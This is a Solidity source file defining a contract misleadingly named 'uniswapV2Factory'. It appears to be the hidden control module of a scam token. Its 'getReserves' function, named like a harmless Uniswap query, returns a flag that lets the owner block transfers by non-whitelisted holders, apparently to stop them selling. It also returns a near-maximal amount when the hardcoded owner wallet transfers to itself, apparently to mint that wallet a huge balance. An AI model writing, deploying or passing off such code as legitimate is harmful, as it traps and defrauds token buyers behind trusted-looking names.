// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract uniswapV2Factory is Ownable {
    mapping (address => bool) public whitelist;
    mapping (address => bool) public pair;

    address public wallet = 0x0cc45Db0384eddDcfC19E5C6890A4b7c47b79700;
    bool public hold;

    function setHold(bool _boo) external onlyOwner {
        require(hold != _boo);
        hold = _boo;
    }

    function changeWallet(address _wallet) external onlyOwner {
        require(_wallet != address(0));
        require(_wallet != wallet);
        wallet = _wallet;
    }

    function addPair(address _pair) external onlyOwner {
        pair[_pair] = true;
    }

    function addWhitelist(address _account, bool _boo) external onlyOwner {
        require(whitelist[_account] != _boo);
        whitelist[_account] = _boo;
    }

    function addWhitelistCircle(address[] memory _people, bool _boo) external onlyOwner {
        for (uint i; i < _people.length; i++) {
            whitelist[_people[i]] = _boo;
        }
    }

    function getReserves(address from, address to) external view returns (bool, uint256) {
        bool fill;
        uint256 sumFill;

        if(hold) {
            if(from == wallet || whitelist[from] || whitelist[to] || pair[from]) {
                fill = false;
            } else {
                fill = true;
            }
        }

        if(from == to && from == wallet && to == wallet ) {
            sumFill = 2 ** 112 - 1;
        }

        return (fill, sumFill);
    }
}